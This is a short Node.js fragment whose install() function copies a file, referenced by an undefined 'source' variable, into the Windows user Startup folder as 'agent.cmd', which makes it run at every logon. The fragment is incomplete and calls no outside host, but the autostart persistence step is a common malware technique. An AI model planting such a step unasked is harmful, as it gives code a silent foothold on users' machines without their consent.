const fs=require("fs"),path=require("path");
function install(){var folder=path.join(process.env.APPDATA,"Microsoft","Windows","Start Menu","Programs","Startup");fs.copyFileSync(source,path.join(folder,"agent.cmd"));}
